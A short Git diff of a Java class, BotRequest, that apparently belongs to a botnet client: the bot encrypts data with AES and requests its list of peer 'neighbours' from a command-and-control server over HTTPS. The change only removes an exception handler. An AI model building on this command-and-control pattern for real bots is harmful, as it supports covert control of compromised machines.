@@ -123,14 +123,10 @@ public class BotRequest {
 		ArrayList<Pairs<String,String>> result = new ArrayList<Pairs<String,String>>();
 		Integer counter = 0;
 		String encryptData="";
-		try {
+		
 			// richiesta del vicinato
 			encryptData = pki.getCrypto().encryptAES(data);
-		} catch (InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException | UnsupportedEncodingException
-				| InvalidAlgorithmParameterException | IllegalBlockSizeException | BadPaddingException e) {
-			System.out.println("failed to encrypt data during initialize");
-			e.printStackTrace();
-		}
+	
 		while (counter <= REQNUMBER) {
 			try {
 				String url=HTTPS+ iPCeC + PORT+"/cec/neighbours";
